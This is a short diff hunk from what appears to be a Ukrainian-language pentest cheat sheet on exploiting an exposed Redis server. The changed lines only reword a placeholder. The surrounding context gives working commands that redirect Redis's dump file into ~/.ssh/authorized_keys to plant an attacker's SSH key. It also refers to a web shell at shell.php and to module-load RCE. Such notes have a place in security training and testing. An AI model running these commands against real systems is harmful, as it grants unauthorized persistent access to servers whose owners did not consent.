@@ -93,7 +93,7 @@ SAVE                         # далі: http://$TARGET/shell.php?c=id
 # 2) SSH-ключ (якщо Redis від юзера з ~/.ssh і запис дозволено)
 CONFIG SET dir /home/<user>/.ssh
 CONFIG SET dbfilename authorized_keys
-SET x "\n\n<твій_публічний_ключ>\n\n"
+SET x "\n\n<публічний_ключ>\n\n"
 SAVE                         # далі: ssh -i key <user>@$TARGET
 ```
 > У RDB-файл потрапить трохи «сміття» навколо значення — для php/ssh це зазвичай не заважає. Module-load RCE — складніше, лишити на крайній випадок.
